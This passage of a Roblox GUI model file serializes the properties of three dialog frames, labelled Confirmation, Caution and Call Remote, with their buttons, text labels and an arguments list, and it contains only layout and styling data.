						<float name="BackgroundTransparency">0</float>
						<Color3 name="BorderColor3">4287993237</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">true</bool>
						<string name="Name">Confirmation</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>0.300000012</XS>
							<XO>0</XO>
							<YS>0.349999994</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>350</XO>
							<YS>0</YS>
							<YO>20</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">false</bool>
						<int name="ZIndex">3</int>
					</Properties>
					<Item class="TextLabel" referent="RBX46FAE782087C4B2A9205CF1C53C7CD33">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4288914085</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">5</token>
							<string name="Name">Title</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>0</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">Confirm</string>
							<Color3 name="TextColor3">4278190080</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">0</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">3</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX83FA56BCC62941349194D713BAE29334">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0.100000001</float>
							<Color3 name="BorderColor3">4290756543</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">MainWindow</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>150</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
						<Item class="TextButton" referent="RBX5A68E5C6A40C461F9FF2B1CF33BA3C6B">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">Yes</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.075000003</XS>
									<XO>0</XO>
									<YS>1</YS>
									<YO>-40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.400000006</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">Yes</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">2</int>
							</Properties>
						</Item>
						<Item class="TextLabel" referent="RBXF478912C0D8F430FAA362B8CAACA066C">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">Desc</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>40</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">The file, FILENAME, already exists. Overwrite?</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">true</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">2</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBXE778BE9E027D41BD8FD34A3DB181240A">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">No</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.524999976</XS>
									<XO>0</XO>
									<YS>1</YS>
									<YO>-40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.400000006</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">No</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">2</int>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="Frame" referent="RBX2E96AAE94B5A4293A7AEBE8EC2E92139">
					<Properties>
						<bool name="Active">true</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4293519849</Color3>
						<float name="BackgroundTransparency">0</float>
						<Color3 name="BorderColor3">4287993237</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">true</bool>
						<string name="Name">Caution</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>0.300000012</XS>
							<XO>0</XO>
							<YS>0.300000012</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>350</XO>
							<YS>0</YS>
							<YO>20</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">false</bool>
						<int name="ZIndex">5</int>
					</Properties>
					<Item class="TextLabel" referent="RBX7CB4DE2F255E485B83313B9831FF9C86">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4288914085</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">5</token>
							<string name="Name">Title</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>0</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">Caution</string>
							<Color3 name="TextColor3">4278190080</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">0</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">5</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBXB3D9B097D3F94D158024E4634ED18BFD">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0.100000001</float>
							<Color3 name="BorderColor3">4290756543</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">MainWindow</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>150</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">4</int>
						</Properties>
						<Item class="TextLabel" referent="RBX466F9A3E08C14FAEB33EE019B0E102F5">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">Desc</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>42</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">The file, FILENAME, already exists. Overwrite?</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">true</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">4</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBX00D41E534C174544884A86CAA5355B2D">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">Ok</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.300000012</XS>
									<XO>0</XO>
									<YS>1</YS>
									<YO>-40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.400000006</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">Ok</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">4</int>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="Frame" referent="RBX6CB7AD428471454EA81558B37937328C">
					<Properties>
						<bool name="Active">true</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4293519849</Color3>
						<float name="BackgroundTransparency">0</float>
						<Color3 name="BorderColor3">4287993237</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">true</bool>
						<string name="Name">CallRemote</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>0.300000012</XS>
							<XO>0</XO>
							<YS>0.300000012</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>350</XO>
							<YS>0</YS>
							<YO>20</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">false</bool>
						<int name="ZIndex">2</int>
					</Properties>
					<Item class="TextLabel" referent="RBX4F9192BF46E64C199A2AA7F9B8AE8C47">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4288914085</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">5</token>
							<string name="Name">Title</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>0</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">Call Remote</string>
							<Color3 name="TextColor3">4278190080</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">0</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX70A5AC29331A4064A8E8C6C4432F1C56">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0.100000001</float>
							<Color3 name="BorderColor3">4290756543</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">MainWindow</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>200</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextLabel" referent="RBX4B00A489271E49E595F836934BCC9AF1">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">Desc</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Arguments</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">true</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="ScrollingFrame" referent="RBX092A1584DBE340E28AE014EADFB68E4B">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<Content name="BottomImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
								<Vector2 name="CanvasPosition">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<UDim2 name="CanvasSize">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<bool name="ClipsDescendants">true</bool>
								<bool name="Draggable">false</bool>
								<Content name="MidImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
								<string name="Name">Arguments</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<int name="ScrollBarThickness">12</int>
								<bool name="ScrollingEnabled">true</bool>
								<bool name="Selectable">true</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>80</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<Content name="TopImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBX10440689DFC3497EA8B62C5546A08E48">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.600000024</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">DisplayReturned</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.075000003</XS>
									<XO>0</XO>
									<YS>0.625</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>20</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text"></string>
								<Color3 name="TextColor3">4294967295</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">2</int>
							</Properties>
							<Item class="TextLabel" referent="RBX46B838069DDA4EBCAA63E9FF894E59F2">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4284572001</Color3>
									<float name="BackgroundTransparency">0.400000006</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">enabled</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>3</XO>
										<YS>0</YS>
										<YO>3</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>14</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
						<Item class="TextLabel" referent="RBXEEF64B98123941F6B75090FCAF0CF8C5">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">Desc2</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.075000003</XS>
									<XO>30</XO>
									<YS>0.625</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.925000012</XS>
									<XO>-30</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Display values returned</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBXC8F5A134CA234D39AD7B4B7538CF5F51">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">4</token>
								<token name="FontSize">7</token>
								<bool name="Modal">false</bool>
								<string name="Name">Add</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.800000012</XS>
